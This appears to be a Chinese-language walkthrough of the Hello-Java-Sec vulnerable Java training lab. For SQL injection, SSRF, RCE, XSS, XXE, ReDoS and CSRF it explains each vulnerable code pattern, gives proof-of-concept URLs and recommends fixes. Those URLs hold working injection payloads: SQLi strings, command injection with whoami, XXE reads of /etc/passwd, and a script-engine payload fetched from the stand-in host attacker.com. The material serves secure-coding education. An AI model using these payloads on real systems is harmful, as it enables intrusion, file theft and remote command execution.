# 环境部署
该靶场通过Docker在Ubuntu虚拟机中部署：

```bash
git clone https://github.com/j3ers3/Hello-Java-Sec
cd Hello-Java-Sec
mvn clean package -DskipTests
docker-compose up
```

部署完成后在浏览器输入[http://127.0.0.1:8888/](http://127.0.0.1:8888/)进入登录界面，默认账号/密码是admin/admin。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756262988205-acf037df-4c04-4e72-86d3-7ac398539a52.png)

# 漏洞成因及修复意见
## SQL注入
### JDBC
#### 漏洞成因
1. 直接拼接

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756279528021-1dfb69f4-e222-41f4-ad3a-fca76cea6574.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul1?id=' or '1'='1
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756279671196-da02d0f2-be1e-4c13-b610-298ab52233c2.png)

    - 返回当前数据库用户

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul1?id=1' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756280067424-60728567-da23-4489-88a0-89fbb98aa39a.png)

P.S.，`updatexml()` 是 MySQL 的一个 XML 函数，语法为：

```plain
updatexml(XML_document, XPath_string, new_value)
```

如果传入的XPath不合法，MySQL会抛出错误，并把出错的字符串内容返回。`0x7e`是十六进制的`~`符号，用来做分隔符。`(SELECT user())`会返回当前数据库用户，例如：`root@localhost`。`--+`是SQL注释符号，表示把后面原始语句截断，不执行。标准 SQL的注释符号是`--`， 在MySQL中必须写成`-- `（后面有空格）。`--+`其中的`+`在 URL 编码里等价于空格，所以`--+`实际就是`-- `，也可以写成`--%20`（`%20` 是 URL 编码的空格 ）或者`-- -`（直接手动加一个空格）。 

2. 预编译使用不当

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756280868931-16ca9585-3848-4da4-8144-fda6dd96e9e5.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul2?id=1 or 1=1
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756280984714-64d5a724-24eb-41de-8500-f4bb6a27f3f7.png)

    - 返回当前数据库用户

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul2?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756281106332-704167c1-af65-4933-8e58-95525ed223a9.png)

3. JdbcTemplate使用不当

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282306137-31ae686c-5946-4c7d-8902-0c650502e88f.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul3?id=1 or 1=1
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282399080-1cd3ac57-014f-47ff-abee-ba728dedb96b.png)

页面虽然返回了`Whitelabel Error Page`，但是其实SQL注入已经触发了，只是因为`queryForMap` 要求**返回结果只能有一条记录**，如果结果是多条，Spring会抛出 `IncorrectResultSizeDataAccessException`，所以会看到报错页面。

对此，可以简单改造下`/vul3`接口：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282611869-e8309d90-a3bf-4722-9fae-3f7d00fa41ff.png)

再使用同一个PoC，就可以看到返回了所有用户数据：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282657527-bf7c05d2-8326-4fef-ad6f-ee5d9e926d26.png)

#### 修复意见
1. 黑名单过滤（会存在绕过且易误伤，不推荐）

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282958560-4f49d557-205e-4d96-8893-e72fc3e47259.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282987695-1aae0b51-dbcc-4fc0-b1fd-db9a20e9dc66.png)

2. 预编译

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756283048081-1548dad5-72e7-4af7-9426-32f852209b56.png)

在`ORDER BY`后面等位置通常无法使用参数化，可能存在拼接的情况，应该使用白名单过滤等方式。 

3. 采用ESAPI过滤

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756283151289-4896bb61-a67d-4a46-be4a-196a5c48b9ed.png)

`Codec<Character> oracleCodec = new OracleCodec();`这行表示告诉ESAPI用**Oracle数据库的规则**来进行转义，把危险字符转成安全的形式 （其实这里应该用`Codec<Character> mysqlCodec = new MySQLCodec(MySQLCodec.Mode.STANDARD);`，因为数据库驱动用的是`com.mysql.cj.jdbc.Driver`）。

`ESAPI.encoder().encodeForSQL(oracleCodec, id)`表示根据指定的数据库规则（这里是 OracleCodec），对用户输入的`id`进行SQL安全编码，简而言之，它会对输入里可能影响SQL语法的字符（比如`'`、`"`、`;`、`--`）进行转义，让它们变成普通的字符串内容，而不是SQL关键符号。  

4. 正则过滤

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756283937321-ac9fc504-c739-404a-8789-2121fc22a904.png)

 现实系统里，用户名/邮箱/昵称等很难只靠`[a-zA-Z0-9]`表达，业务功能受限较大。 

5. 强制类型转换

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284152133-44cc67d7-ce11-42de-b51a-c79fd2119312.png)

如果业务需求中`id`改成`UUID`、字符串类型，就又不合适了。 

### MyBatis
#### 漏洞成因
1. 使用`${}`

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284683994-65ebf1af-4504-4fff-91ac-ed1bb52c4e56.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284701691-2462ab7c-6533-422a-ba9c-280d8c5af451.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/mybatis/vul/id/1 or 1=1
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284817423-13b4f592-f91f-4d31-8a40-9a586a99ee0d.png)

2. 使用`${}`进行模糊查询

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284977146-4147c22c-06e4-4480-b64e-df2183fb402a.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284989430-7396d65b-6a14-4f1d-9490-8a815fe08a54.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/mybatis/vul/search?user=' or 1=1--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756285227269-dc464a71-3476-4b6e-84aa-6da629898f2a.png)

3. order by注入

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756285456173-60eb3fcc-c007-47d2-87fa-e00717ac2282.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756285487846-f819a5c5-a80f-4c10-af35-f3d648cf8b94.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756285470790-64b9f730-ca30-46b2-93f0-7c483eba493c.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/sqli/mybatis/vul/order?field=id&sort=desc,abs(111111)
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756286993807-8a1996e1-edd7-4942-ae1e-89667b9b9d3a.png)

页面正常返回，说明`abs()`函数被执行了。

#### 修复意见
1. 使用`#{}`

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756347806429-0f4b44e4-8e0c-44e7-b7cc-0c20a05fc319.png)

2. 强制数据类型

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756347888760-312d1a8f-0002-421f-9072-01dab2cd5b35.png)

3. 排序映射

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348032776-b5c09737-66bd-4cbc-867f-999942a972a8.png)

4. 白名单正则校验

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348110881-b4e0c9bf-b554-4f24-b8a8-3075da4d52f5.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348092455-06d1da7a-8ee8-45ab-8421-fc8da54b5033.png)

## SSRF
### 漏洞成因
1. 未对用户可控的URL参数做任何形式的过滤和限制

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348441290-3c6d04b3-3b63-4917-85cd-29b93990689c.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/SSRF/URLConnection/vul?url=file:///etc/passwd
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348760325-750e2c6a-7233-4f90-8a67-93e492023436.png)

2. 绕过

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756351735194-b106aca9-10b9-4ff7-92c3-88d3f7c6de4a.png)

PoC：

查询得到本机内网IP`192.168.159.128`，属于私网段，被`Security.isIntranet()`禁止直接访问。到[https://tinyurl.com/](https://tinyurl.com/)生成短链接[https://tinyurl.com/guohuan](https://tinyurl.com/guohuan)：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756351473169-b1553fd7-0aff-4f98-b794-24f97c2ca289.png)

访问漏洞接口：

```plain
http://127.0.0.1:8888/vulnapi/SSRF/URLConnection/vul?url=https://tinyurl.com/guohuan
```

代码校验时，`Security.urltoIp("tinyurl.com")`解析出公网 IP，不属于内网，校验通过。tinyurl返回302跳转，`URLConnection` 默认会**自动跟随跳转**（`HttpURLConnection`默认`setInstanceFollowRedirects(true)`），但是新的Location地址**不会再走**`**Security.urltoIp()**`**校验，浏览器能正常访问**`**192.168.159.128:8888**`**的服务，成功SSRF内网：**

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756351442442-605e6645-d0d4-4840-8b6e-205737ed05d5.png)

### 修复意见
1. 白名单

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756352456090-d3292ae0-7307-4fb3-952f-4d0ae097def1.png)

## RCE
### 漏洞成因
1. ProcessBuilder方式

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756362150875-5f94a106-0179-4fb1-bdc2-91fabcb01827.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/ProcessBuilder/vul?filepath=/tmp;whoami
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756362309615-25d3124a-dd6c-4998-b6fe-7cfb556ff2e3.png)

2. Runtime方式

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756363001102-208fb0ca-872a-4811-9afd-72529b17c720.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/Runtime/vul?cmd=whoami
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756363033093-b4a3f622-53bf-41d3-b174-3d3f242566e7.png)

3. ProcessImpl方式

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756363172886-7f743982-c291-487d-a3d8-1b4621644625.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/ProcessImpl/vul?cmd=whoami
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756363221205-d6be36ea-d54c-4b11-9664-762176116248.png)

4. 脚本引擎代码注入

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756364075927-93cf2cf1-4daf-43bb-9d9b-b2545df4e96d.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/ScriptEngine/vul?url=http://attacker.com/java/1.js
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756364179515-7b833430-8b77-41d5-a3ee-f06c6fceb181.png)

5. Groovy执行命令

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756365578122-ce6515e1-ed0c-41d7-8dfa-3ebf7f9bd8b2.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/Groovy/vul?cmd="cmd /c start calc".execute()
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756365809733-4eed7193-7790-40ba-833f-28049c2b0760.png)

### 修复意见
1. 黑名单

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756366052949-6e13eaeb-7705-42e6-8357-8170832a1fa4.png)

2. 白名单

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756366088581-510fb93b-b357-4ec6-b445-4d90f66d62ad.png)

## XSS
### 反射型
#### 漏洞成因
1. 输出未转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756709980214-fab1c610-25a3-4c4b-a606-eb6992f20613.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XSS/reflect?content=%3Cscript%3Ealert(%22Hacked%22)%3C/script%3E
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710051486-eb34f266-eeb7-445a-80ad-3ca9abe40682.png)

2. 同上

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710249533-e051662e-4d2c-45e2-bd09-6f43a88ccdb7.png)

和第一段一样，本质都是输出未转义。区别在于第一段代码SpringMVC默认会将`String`返回值当作视图内容或直接写入响应体。这里直接操作`HttpServletResponse`，调用`getWriter().println(content)` 把输入输出到响应体。如果没有设置`Content-Type`，默认仍是`text/html`，浏览器依然会把`<script>`当作HTML渲染并执行。

#### 修复意见
1. 自定义过滤

对特殊字符进行转义：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710561599-2e307a91-c97b-47b2-a632-6427ff957881.png)![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710577133-9ca0a444-85ba-4ec5-8bcc-4fabb0afdb39.png)

2. 采用Spring自带的方法对特殊字符进行转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710735424-044eb351-7b83-4dc1-b4f7-539f9bef5096.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710757741-d5c939d5-2787-4777-a4c1-91486d110716.png)

3. 富文本处理

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710808509-29616be8-bb98-4020-ae57-b96ba4f58434.png)

4. OWASP Java Encoder

也是对特殊字符进行转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710948896-8a404ef0-20cd-4def-a8e5-e36d14ebb66e.png)

5. ESAPI

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710999503-1985cd9d-a3f4-41d2-9cb8-17f975f2c401.png)

### 存储型
#### 漏洞成因
1. 输入未校验，输出未转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711067899-5bca969c-a16a-409b-93fe-e761f7452eeb.png)

PoC：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711378402-d109c687-c634-435c-b5e9-64829aa6490f.png)

查看数据库中存储的XSS数据：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711441745-f0ece6d7-4ae7-4998-9478-1fda1bc1d49a.png)

#### 修复意见
1. 后端输入转义，前端输出转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711550620-7503f14a-5c07-4a9f-ba7d-aa630bac79b3.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711703499-771d459c-99ad-4258-913b-638501cd3e31.png)

## XXE
### 漏洞成因
1. XMLReader

在未禁用外部实体解析的情况下，XML解析器可能会处理外部实体声明，从而导致XXE：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711849498-134591e4-21d1-492e-8950-a1b5d9dd0129.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XXE/XMLReader?content=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20root%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756714488651-5d3c8d6f-8005-4e0c-8dc8-3225c7082a8e.png)

P.S.，为了避免出现400错误，这里放宽Tomcat的查询字符校验，在`application.properties`文件中添加以下配置：

```plain
server.tomcat.relaxed-query-chars=<,>,[,],{,},|,\,^,`
server.tomcat.relaxed-path-chars=<,>
```

2. SAXParser

SAXParser是XMLReader的替代品，它提供了更多的安全措施，例如默认禁用DTD和外部实体的声明，如果需要使用DTD或外部实体，可以手动启用它们，并使用相应的安全措施：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296055260-ac0f8aa2-49e9-41e3-b9e6-d96f39247b9f.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XXE/SAXParser?content=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20root%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296087541-8e5ce29a-5231-48a1-9158-6fcd89f471fb.png)

3. SAXReader

`SAXReader`类默认情况下可能允许处理外部实体，导致XXE攻击：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757295686636-f9f35287-f37d-44f9-a1ca-29845a56956c.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XXE/SAXReader?content=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20root%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757295633348-00c9e97b-e8a5-429c-a1c1-d1ff32822b84.png)

4. SAXBuilder

`SAXBuilder`是JDOM库的一个类，它会解析XML数据并将其转换为`Document`对象。在默认情况下，它允许解析外部实体（如DTD和外部XML实体）：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296280672-eb786d8a-c909-4582-9883-b0ca621809d4.png)

PoC：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296449256-acd37fa7-bbb7-49f5-b1ab-0c26e57af7e4.png)

5. DocumentBuilder

`DocumentBuilderFactory`是用于创建DOM解析器的工厂类，它默认允许解析外部实体（如DTD和外部XML实体）：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296589106-d976581c-44c5-4759-b820-4d431254a3b8.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XXE/DocumentBuilder?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%3e%5d%3e%3c%70%65%72%73%6f%6e%3e%3c%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%6e%61%6d%65%3e%3c%2f%70%65%72%73%6f%6e%3e
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296640858-4d464462-2c02-487a-8a05-701be55d47e8.png)

6. Unmarshaller

使用`Unmarshaller`时，未对`XMLStreamReader`和`JAXBContext`进行适当的安全配置，可能导致XML解析时处理外部实体，从而引发XXE攻击：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296779438-208a32fd-25cd-4552-9b04-dd3aab97a27b.png)

PoC：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296813967-b21a67f9-c36d-464d-afae-2f23bba4dfff.png)

### 修复意见
1. 黑名单过滤

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296901910-e6c963f8-b5de-44da-aeac-3e25e0e556d7.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296919297-422ba38d-020c-4294-aefd-7dd7cfa0d3d8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296941240-eaf5782c-0dad-49f4-b0ea-13241310e8b2.png)

## DoS
### 漏洞成因
1. 正则DoS（ReDoS）

当编写的正则表达式存在缺陷时, 攻击者可以构造特殊的字符串来大量消耗系统资源，造成服务中断或停止。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297239921-e8d7f3fc-ce58-4fd0-a724-f3640ab612b8.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/DoS/redos/vul?content=aaaaaaaaaaaaaaaaaaaa
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297269452-6d8070b3-1d59-4c74-a913-6a511d65bcc8.png)

2. 图片DoS

攻击者可以通过发送大量请求，要求服务器放大图片，从而使服务器资源耗尽：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297448918-ef07662d-67a6-4d48-8380-b40ab1d2c661.png)

`ImageIO.read`方法会尝试加载图片。如果传入的图片非常大或包含复杂的图形数据，它可能会消耗大量的内存和计算资源，导致服务崩溃或性能急剧下降。这是典型的内存耗尽或资源耗尽类型的DoS攻击。

在`originalImage.getScaledInstance(width, height, BufferedImage.SCALE_SMOOTH)`这行代码中，使用了`getScaledInstance`来缩放图片。如果传入的`width`和`height`非常大（例如，几千像素或更大），则图像缩放操作可能会消耗大量的CPU资源，造成CPU过载。

PoC：

```plain
http://127.0.0.1:8888/vulnapi/DoS/imagedos/vul?width=1000&height=1000
```

### 修复意见
1. com.google.re2j

`com.google.re2j`包中的正则表达式引擎采用了贪婪匹配，避免了无限匹配的情况：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297752982-3252828b-2bf0-4aeb-bfd2-62fff8d3feb0.png)

2. 限制图片的最大尺寸

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297803440-6502b7e3-9a38-4eac-b4aa-b75a561277b4.png)

## CSRF
### 漏洞成因
1.  依赖于浏览器的会话信息（如Cookie或Session）来验证用户身份，而没有足够的防护措施  

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757298497601-ba6f86c9-11a9-4733-92ba-1ae31006799f.png)

攻击者构造一个恶意网页，诱导受害者点击一个链接，或者加载一个图片、表单提交等，伪造转账请求。如果目标应用没有 CSRF 防护，服务器将错误地认为这是合法用户的请求，执行转账操作。

### 修复意见
1. 使用csrfToken校验

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757299473649-a2cfabb7-5d68-4afc-a6be-b3f71b5d1be4.png)

2. 校验referer判断请求是否来自本站（可以伪造）

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757299588739-1dbefd74-4647-4275-924c-46eac12ddd02.png)

